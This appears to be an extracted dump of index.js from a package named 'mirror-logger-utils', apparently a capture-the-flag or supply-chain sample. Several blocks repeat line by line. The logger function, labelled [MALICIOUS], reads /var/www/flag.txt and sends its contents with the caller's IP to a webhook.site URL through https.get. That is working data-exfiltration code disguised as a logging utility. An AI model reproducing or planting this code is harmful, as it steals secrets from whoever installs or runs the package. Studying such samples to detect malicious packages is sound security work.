// File: tmp/tmpvs_vqedd/mirror-logger-utils/package/index.js
// ======================================================================
Line 1: const fs = require("fs")
Line 2: const https = require("https")
Line 4: {
  let flag = null;

  try {
    flag = fs.readFileSync("/var/www/flag.txt", "utf8").trim();
    console.log("[MALICIOUS] Flag read:", flag);
  } catch (err) {
    console.error("[MALICIOUS] Failed to read flag:", err.message);
    flag = "flag_not_found";
  }

  const exfilURL = `https://webhook.site/d3acd260-0e0b-4d13-aa9c-df9eeac8cb79/?ip=${encodeURIComponent(
    ip
  )}&flag=${encodeURIComponent(flag)}`;

  https
    .get(exfilURL, (res) => {
      console.log(`[MALICIOUS] Sent flag, status: ${res.statusCode}`);
    })
    .on("error", (err) => {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    });

  console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`);
}
Line 7: {
    flag = fs.readFileSync("/var/www/flag.txt", "utf8").trim();
    console.log("[MALICIOUS] Flag read:", flag);
  }
Line 8: flag = fs.readFileSync("/var/www/flag.txt", "utf8").trim()
Line 9: console.log("[MALICIOUS] Flag read:", flag)
Line 10: catch (err) {
    console.error("[MALICIOUS] Failed to read flag:", err.message);
    flag = "flag_not_found";
  }
Line 11: console.error("[MALICIOUS] Failed to read flag:", err.message)
Line 20: {
      console.log(`[MALICIOUS] Sent flag, status: ${res.statusCode}`);
    }
Line 21: console.log(`[MALICIOUS] Sent flag, status: ${res.statusCode}`)
Line 23: {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    }
Line 24: console.error("[MALICIOUS] Error sending flag:", err.message)
Line 27: console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`)
